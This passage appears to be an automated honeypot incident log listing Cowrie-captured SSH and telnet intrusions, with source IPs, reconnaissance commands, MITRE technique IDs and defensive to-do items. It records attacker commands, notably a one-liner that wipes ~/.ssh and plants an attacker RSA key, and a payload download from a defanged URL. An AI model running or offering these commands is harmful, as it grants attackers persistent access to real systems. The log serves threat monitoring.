| `2026-03-11 16:42:53` | `cowrie.client.version` |
| `2026-03-11 16:42:53` | `cowrie.client.kex` |
| `2026-03-11 16:42:54` | `cowrie.login.success` |
| `2026-03-11 16:42:54` | `cowrie.session.params` |
| `2026-03-11 16:42:54` | `cowrie.command.input` |
| `2026-03-11 16:42:54` | `cowrie.log.closed` |
| `2026-03-11 16:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-340a5f552205

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:43 |
| **Last Seen** | 2026-03-11 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:43:07` | `cowrie.session.connect` |
| `2026-03-11 16:43:07` | `cowrie.client.version` |
| `2026-03-11 16:43:07` | `cowrie.client.kex` |
| `2026-03-11 16:43:07` | `cowrie.login.success` |
| `2026-03-11 16:43:08` | `cowrie.session.params` |
| `2026-03-11 16:43:08` | `cowrie.command.input` |
| `2026-03-11 16:43:08` | `cowrie.log.closed` |
| `2026-03-11 16:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9f230a10bc

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:43 |
| **Last Seen** | 2026-03-11 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:43:20` | `cowrie.session.connect` |
| `2026-03-11 16:43:20` | `cowrie.client.version` |
| `2026-03-11 16:43:20` | `cowrie.client.kex` |
| `2026-03-11 16:43:21` | `cowrie.login.success` |
| `2026-03-11 16:43:22` | `cowrie.session.params` |
| `2026-03-11 16:43:22` | `cowrie.command.input` |
| `2026-03-11 16:43:22` | `cowrie.log.closed` |
| `2026-03-11 16:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69982de1e72f

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:43 |
| **Last Seen** | 2026-03-11 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:43:35` | `cowrie.session.connect` |
| `2026-03-11 16:43:35` | `cowrie.client.version` |
| `2026-03-11 16:43:35` | `cowrie.client.kex` |
| `2026-03-11 16:43:36` | `cowrie.login.success` |
| `2026-03-11 16:43:36` | `cowrie.session.params` |
| `2026-03-11 16:43:36` | `cowrie.command.input` |
| `2026-03-11 16:43:36` | `cowrie.log.closed` |
| `2026-03-11 16:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83f9488e57b4

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:44 |
| **Last Seen** | 2026-03-11 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:44:03` | `cowrie.session.connect` |
| `2026-03-11 16:44:03` | `cowrie.client.version` |
| `2026-03-11 16:44:04` | `cowrie.client.kex` |
| `2026-03-11 16:44:04` | `cowrie.login.success` |
| `2026-03-11 16:44:05` | `cowrie.session.params` |
| `2026-03-11 16:44:05` | `cowrie.command.input` |
| `2026-03-11 16:44:05` | `cowrie.log.closed` |
| `2026-03-11 16:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b90db82b88

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:44 |
| **Last Seen** | 2026-03-11 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:44:33` | `cowrie.session.connect` |
| `2026-03-11 16:44:33` | `cowrie.client.version` |
| `2026-03-11 16:44:33` | `cowrie.client.kex` |
| `2026-03-11 16:44:33` | `cowrie.login.success` |
| `2026-03-11 16:44:34` | `cowrie.session.params` |
| `2026-03-11 16:44:34` | `cowrie.command.input` |
| `2026-03-11 16:44:34` | `cowrie.log.closed` |
| `2026-03-11 16:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e15a604b878

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:45 |
| **Last Seen** | 2026-03-11 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:45:07` | `cowrie.session.connect` |
| `2026-03-11 16:45:07` | `cowrie.client.version` |
| `2026-03-11 16:45:07` | `cowrie.client.kex` |
| `2026-03-11 16:45:07` | `cowrie.login.success` |
| `2026-03-11 16:45:08` | `cowrie.session.params` |
| `2026-03-11 16:45:08` | `cowrie.command.input` |
| `2026-03-11 16:45:08` | `cowrie.log.closed` |
| `2026-03-11 16:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3b1a6e840f

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:45 |
| **Last Seen** | 2026-03-11 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:45:41` | `cowrie.session.connect` |
| `2026-03-11 16:45:41` | `cowrie.client.version` |
| `2026-03-11 16:45:41` | `cowrie.client.kex` |
| `2026-03-11 16:45:42` | `cowrie.login.success` |
| `2026-03-11 16:45:42` | `cowrie.session.params` |
| `2026-03-11 16:45:42` | `cowrie.command.input` |
| `2026-03-11 16:45:42` | `cowrie.log.closed` |
| `2026-03-11 16:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadca37a73ea

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:46 |
| **Last Seen** | 2026-03-11 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:46:16` | `cowrie.session.connect` |
| `2026-03-11 16:46:16` | `cowrie.client.version` |
| `2026-03-11 16:46:16` | `cowrie.client.kex` |
| `2026-03-11 16:46:16` | `cowrie.login.success` |
| `2026-03-11 16:46:17` | `cowrie.session.params` |
| `2026-03-11 16:46:17` | `cowrie.command.input` |
| `2026-03-11 16:46:17` | `cowrie.log.closed` |
| `2026-03-11 16:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c2b04f8a05

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:46 |
| **Last Seen** | 2026-03-11 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:46:51` | `cowrie.session.connect` |
| `2026-03-11 16:46:51` | `cowrie.client.version` |
| `2026-03-11 16:46:51` | `cowrie.client.kex` |
| `2026-03-11 16:46:51` | `cowrie.login.success` |
| `2026-03-11 16:46:52` | `cowrie.session.params` |
| `2026-03-11 16:46:52` | `cowrie.command.input` |
| `2026-03-11 16:46:52` | `cowrie.log.closed` |
| `2026-03-11 16:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ebadefe7eb4

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:47 |
| **Last Seen** | 2026-03-11 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:47:26` | `cowrie.session.connect` |
| `2026-03-11 16:47:26` | `cowrie.client.version` |
| `2026-03-11 16:47:26` | `cowrie.client.kex` |
| `2026-03-11 16:47:27` | `cowrie.login.success` |
| `2026-03-11 16:47:27` | `cowrie.session.params` |
| `2026-03-11 16:47:27` | `cowrie.command.input` |
| `2026-03-11 16:47:27` | `cowrie.log.closed` |
| `2026-03-11 16:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42613dd099d4

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:48 |
| **Last Seen** | 2026-03-11 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:48:02` | `cowrie.session.connect` |
| `2026-03-11 16:48:02` | `cowrie.client.version` |
| `2026-03-11 16:48:02` | `cowrie.client.kex` |
| `2026-03-11 16:48:02` | `cowrie.login.success` |
| `2026-03-11 16:48:03` | `cowrie.session.params` |
| `2026-03-11 16:48:03` | `cowrie.command.input` |
| `2026-03-11 16:48:03` | `cowrie.log.closed` |
| `2026-03-11 16:48:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b1b8b576f1

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:48 |
| **Last Seen** | 2026-03-11 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:48:38` | `cowrie.session.connect` |
| `2026-03-11 16:48:38` | `cowrie.client.version` |
| `2026-03-11 16:48:38` | `cowrie.client.kex` |
| `2026-03-11 16:48:39` | `cowrie.login.success` |
| `2026-03-11 16:48:39` | `cowrie.session.params` |
| `2026-03-11 16:48:39` | `cowrie.command.input` |
| `2026-03-11 16:48:39` | `cowrie.log.closed` |
| `2026-03-11 16:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65878def618

| Field | Detail |
|---|---|
| **Source IP** | `167.71.84[.]143` |
| **First Seen** | 2026-03-11 16:49 |
| **Last Seen** | 2026-03-11 16:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 16:49:15` | `cowrie.session.connect` |
| `2026-03-11 16:49:15` | `cowrie.client.version` |
| `2026-03-11 16:49:15` | `cowrie.client.kex` |
| `2026-03-11 16:49:16` | `cowrie.login.success` |
| `2026-03-11 16:49:16` | `cowrie.session.params` |
| `2026-03-11 16:49:16` | `cowrie.command.input` |
| `2026-03-11 16:49:16` | `cowrie.log.closed` |
| `2026-03-11 16:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.84[.]143` to AbuseIPDB if not already reported
- [ ] Block `167.71.84[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eca653253e4

| Field | Detail |
|---|---|
| **Source IP** | `167.99.180[.]50` |
| **First Seen** | 2026-03-11 17:10 |
| **Last Seen** | 2026-03-11 17:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 17:10:14` | `cowrie.session.connect` |
| `2026-03-11 17:10:15` | `cowrie.client.version` |
| `2026-03-11 17:10:15` | `cowrie.client.kex` |
| `2026-03-11 17:10:19` | `cowrie.login.success` |
| `2026-03-11 17:10:20` | `cowrie.session.params` |
| `2026-03-11 17:10:20` | `cowrie.command.input` |
| `2026-03-11 17:10:20` | `cowrie.command.input` |
| `2026-03-11 17:10:20` | `cowrie.command.input` |
| `2026-03-11 17:10:20` | `cowrie.command.input` |
| `2026-03-11 17:10:21` | `cowrie.log.closed` |
| `2026-03-11 17:10:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.180[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.99.180[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe8d4fe8963

| Field | Detail |
|---|---|
| **Source IP** | `167.99.180[.]50` |
| **First Seen** | 2026-03-11 17:11 |
| **Last Seen** | 2026-03-11 17:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 17:11:32` | `cowrie.session.connect` |
| `2026-03-11 17:11:32` | `cowrie.client.version` |
| `2026-03-11 17:11:32` | `cowrie.client.kex` |
| `2026-03-11 17:11:35` | `cowrie.login.success` |
| `2026-03-11 17:11:37` | `cowrie.session.params` |
| `2026-03-11 17:11:37` | `cowrie.command.input` |
| `2026-03-11 17:11:37` | `cowrie.command.input` |
| `2026-03-11 17:11:37` | `cowrie.command.input` |
| `2026-03-11 17:11:37` | `cowrie.command.input` |
| `2026-03-11 17:11:37` | `cowrie.log.closed` |
| `2026-03-11 17:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.180[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.99.180[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f2b4d6536a

| Field | Detail |
|---|---|
| **Source IP** | `20.105.65[.]67` |
| **First Seen** | 2026-03-11 17:44 |
| **Last Seen** | 2026-03-11 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 17:44:41` | `cowrie.session.connect` |
| `2026-03-11 17:44:41` | `cowrie.client.version` |
| `2026-03-11 17:44:41` | `cowrie.client.kex` |
| `2026-03-11 17:44:41` | `cowrie.login.success` |
| `2026-03-11 17:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.105.65[.]67` to AbuseIPDB if not already reported
- [ ] Block `20.105.65[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ee91dd179d

| Field | Detail |
|---|---|
| **Source IP** | `176.221.111[.]222` |
| **First Seen** | 2026-03-11 17:59 |
| **Last Seen** | 2026-03-11 18:01 |
| **Session Duration** | 102s |
| **Login Attempts** | 3 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox WRZBU` |
| **Download Attempts** | hxxp://5.181.28[.]63:5945/.i |
| **Malware Analysis** | a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 17:59:31` | `cowrie.session.connect` |
| `2026-03-11 17:59:32` | `cowrie.telnet.option` |
| `2026-03-11 17:59:32` | `cowrie.login.failed` |
| `2026-03-11 17:59:32` | `cowrie.telnet.option` |
| `2026-03-11 17:59:32` | `cowrie.login.failed` |
| `2026-03-11 17:59:33` | `cowrie.telnet.option` |
| `2026-03-11 17:59:33` | `cowrie.login.success` |
| `2026-03-11 17:59:33` | `cowrie.session.params` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:33` | `cowrie.command.failed` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:33` | `cowrie.command.failed` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:33` | `cowrie.command.input` |
| `2026-03-11 17:59:34` | `cowrie.command.input` |
| `2026-03-11 17:59:34` | `cowrie.command.input` |
| `2026-03-11 17:59:34` | `cowrie.command.failed` |
| `2026-03-11 17:59:34` | `cowrie.command.input` |
| `2026-03-11 17:59:34` | `cowrie.command.input` |
| `2026-03-11 17:59:35` | `cowrie.session.file_download` |
| `2026-03-11 18:01:14` | `cowrie.log.closed` |
| `2026-03-11 18:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.221.111[.]222` to AbuseIPDB if not already reported
- [ ] Block `176.221.111[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd3a2d9a2d7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-03-11 18:30 |
| **Last Seen** | 2026-03-11 18:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 18:30:59` | `cowrie.session.connect` |
| `2026-03-11 18:30:59` | `cowrie.client.version` |
| `2026-03-11 18:30:59` | `cowrie.client.kex` |
| `2026-03-11 18:30:59` | `cowrie.login.success` |
| `2026-03-11 18:30:59` | `cowrie.session.params` |
| `2026-03-11 18:30:59` | `cowrie.command.input` |
| `2026-03-11 18:30:59` | `cowrie.command.failed` |
| `2026-03-11 18:30:59` | `cowrie.log.closed` |
| `2026-03-11 18:31:00` | `cowrie.session.params` |
| `2026-03-11 18:31:00` | `cowrie.command.input` |
| `2026-03-11 18:31:00` | `cowrie.session.file_download` |
| `2026-03-11 18:31:00` | `cowrie.log.closed` |
| `2026-03-11 18:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c1bc06dc46

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-03-11 18:31 |
| **Last Seen** | 2026-03-11 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 18:31:01` | `cowrie.session.connect` |
| `2026-03-11 18:31:01` | `cowrie.client.version` |
| `2026-03-11 18:31:01` | `cowrie.client.kex` |
| `2026-03-11 18:31:02` | `cowrie.login.success` |
| `2026-03-11 18:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c43161a4401

| Field | Detail |
|---|---|
| **Source IP** | `206.189.143[.]89` |
| **First Seen** | 2026-03-11 18:33 |
| **Last Seen** | 2026-03-11 18:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 18:33:06` | `cowrie.session.connect` |
| `2026-03-11 18:33:06` | `cowrie.client.version` |
| `2026-03-11 18:33:06` | `cowrie.client.kex` |
| `2026-03-11 18:33:06` | `cowrie.login.success` |
| `2026-03-11 18:33:06` | `cowrie.session.params` |
| `2026-03-11 18:33:06` | `cowrie.command.input` |
| `2026-03-11 18:33:06` | `cowrie.log.closed` |
| `2026-03-11 18:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.143[.]89` to AbuseIPDB if not already reported
- [ ] Block `206.189.143[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d39522f10093

| Field | Detail |
|---|---|
| **Source IP** | `206.189.143[.]89` |
| **First Seen** | 2026-03-11 18:33 |
| **Last Seen** | 2026-03-11 18:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-11 18:33:42` | `cowrie.session.connect` |
| `2026-03-11 18:33:42` | `cowrie.client.version` |
| `2026-03-11 18:33:42` | `cowrie.client.kex` |
| `2026-03-11 18:33:42` | `cowrie.login.success` |
| `2026-03-11 18:33:42` | `cowrie.session.params` |
| `2026-03-11 18:33:42` | `cowrie.command.input` |
| `2026-03-11 18:33:42` | `cowrie.log.closed` |
| `2026-03-11 18:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.143[.]89` to AbuseIPDB if not already reported
- [ ] Block `206.189.143[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9c3df38166e

| Field | Detail |
|---|---|
| **Source IP** | `179.125.24[.]202` |
| **First Seen** | 2026-03-11 19:04 |
| **Last Seen** | 2026-03-11 19:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
